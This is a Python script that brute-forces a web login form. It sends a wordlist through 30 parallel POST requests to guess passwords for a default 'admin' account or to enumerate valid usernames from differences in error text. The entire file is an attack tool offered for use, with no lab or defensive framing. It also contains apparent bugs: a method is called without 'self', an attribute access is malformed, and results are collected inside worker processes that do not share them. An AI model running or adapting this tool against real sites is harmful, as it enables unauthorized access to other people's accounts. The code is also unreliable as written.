import requests
import multiprocessing
import argparse

"""
usage: login.py [-h] --file FILE --url URL [--avoid AVOID]
                [--check_username CHECK_USERNAME]
                [--login_username LOGIN_USERNAME] [--password PASSWORD]

optional arguments:
  -h, --help            show this help message and exit
  --file FILE, -f FILE  List file to use
  --url URL, -U URL     Url to bruteforce
  --avoid AVOID, -a AVOID
                        Text to avoid
  --check_username CHECK_USERNAME, -cu CHECK_USERNAME
                        Check username - [!] True if specified
  --login_username LOGIN_USERNAME, -l LOGIN_USERNAME
                        Default username to use
  --password PASSWORD, -p PASSWORD
                        Default password to use
"""


class BF:
    def __init__(self, file: str, url: str, avoid_text: str,
                 check_username: bool, username: str, password: str):
        self.words_filepath = file
        self.avoid_text = avoid_text
        self.url_login = url
        self.words = []
        self.set_words()
        self.results = []
        self.username = username
        self.password = password
        self.check_username = check_username

    def set_words(self):
        with open(self.words_filepath, 'r', errors='replace') as f:
            self.words = [x.replace('\n', '') for x in f.readlines()]

    def get_credentials(self, word: str) -> tuple:
        username = word
        password = self.password
        if self.check_username is False:
            username = self.username
            password = word
        return (username, password)

    def login_process(self, word: str):
        print(word)
        try:
            username, password = get_credentials(word=word)

            r = requests.post(self.url_login, data={
                "username": username,
                "password": password
            })

            if not self.avoid_text in r.text:
                self.results.append(word)
        except ValueError as error:
            print('Error while processing word {}'.format(word))
            print(error)

    def print_results(self):
        print('Valid usernames :')
        for result in self.results:
            print("\t- {}".format(result))

    def run(self):
        p = multiprocessing.Pool(30)
        p.map(self.login_process, self.words)
        p.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--file', '-f', help='List file to use', required=True)
    parser.add_argument('--url', '-U', help='Url to bruteforce', required=True)
    parser.add_argument('--avoid', '-a', help='Text to avoid',
                        default='Invalid username')
    parser.add_argument('--check_username', '-cu',
                        help='Check username - [!] True if specified', default=False)
    parser.add_argument('--login_username', '-l',
                        help='Default username to use', default="admin")
    parser.add_argument('--password', '-p', help='Default password to use',
                        required=False, default="123456789")

    args = parser.parse_args()
    check_username = False if not args.check_username else True

    bf = BF(file=args.file, url=args.url, avoid_text=args.avoid,
            username=args.login-username, password=args.password, check_username=check_username)
    print('Bruteforce attack will try {0} alternatives'.format(len(bf.words)))
    bf.run()
    bf.print_results()
